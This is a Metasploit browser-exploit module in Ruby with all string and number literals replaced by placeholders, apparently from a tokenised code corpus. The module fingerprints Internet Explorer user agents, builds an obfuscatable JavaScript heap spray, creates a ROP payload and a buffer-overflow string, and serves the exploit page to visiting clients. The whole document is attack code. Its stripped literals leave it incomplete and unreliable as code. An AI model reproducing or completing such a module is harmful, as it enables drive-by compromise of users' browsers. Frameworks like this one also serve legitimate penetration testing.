require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: RopDb def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > true , <str> = > <str> } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , false ] ) ] , self . class ) end def get_target ( agent ) return target if target . name != <str> nt = agent . scan ( <str> ) . flatten [ <int> ] || <str> ie = agent . scan ( <str> ) . flatten [ <int> ] || <str> ie_name = <str> ie <str> case nt when <str> os_name = <str> when <str> os_name = <str> when <str> os_name = <str> end targets . each do | t | if ( ! ie . empty? and t . name . include? ( ie_name ) ) and ( ! nt . empty? and t . name . include? ( os_name ) ) print_status ( <str> t . name <str> ) return t end end return nil end def ie_heap_spray ( my_target , p ) js_code = Rex :: Text . to_unescape ( p , Rex :: Arch . endian ( target . arch ) ) js_nops = Rex :: Text . to_unescape ( <str> * <int> , Rex :: Arch . endian ( target . arch ) ) js_random_nops = Rex :: Text . to_unescape ( make_nops ( <int> ) , Rex :: Arch . endian ( my_target . arch ) ) case my_target when targets [ <int> ] js = <str> js_code <str> js_random_nops <str> my_target [ <str> ] <str> else js = <str> js_code <str> js_nops <str> my_target [ <str> ] <str> end js = heaplib ( js , { <str> = > true } ) if datastore [ <str> ] js = :: Rex :: Exploitation :: JSObfu . new ( js ) js . obfuscate end return js end def get_payload ( t , cli ) code = payload . encoded return code if t [ <str> ] . nil? case t [ <str> ] when <str> print_status ( <str> ) rop_payload = generate_rop_payload ( <str> , code ) end return rop_payload end def load_exploit_html ( my_target , cli ) p = get_payload ( my_target , cli ) js = ie_heap_spray ( my_target , p ) bof = rand_text_alpha ( <int> ) bof << [ my_target . ret ] . pack ( <str> ) if my_target [ <str> ] bof << rand_text_alpha ( <int> ) bof << [ <hex> ] . pack ( <str> ) end my_bof = Rex :: Text . to_unescape ( bof ) html = <str> js <str> rand_text_alpha ( rand ( <int> ) + <int> ) <str> my_bof <str> rand_text_numeric ( <int> ) <str> rand_text_numeric ( <int> ) <str> rand_text_numeric ( <int> ) <str> rand_text_numeric ( <int> ) <str> rand_text_numeric ( <int> ) <str> rand_text_numeric ( <int> ) <str> return html end def on_request_uri ( cli , request ) agent = request . headers [ <str> ] uri = request . uri print_status ( <str> uri <str> ) my_target = get_target ( agent ) if my_target . nil? print_error ( <str> agent <str> ) send_not_found ( cli ) return end html = load_exploit_html ( my_target , cli ) html = html . gsub ( <str> , <str> ) print_status ( <str> ) send_response ( cli , html , { <str> = > <str> } ) end end 
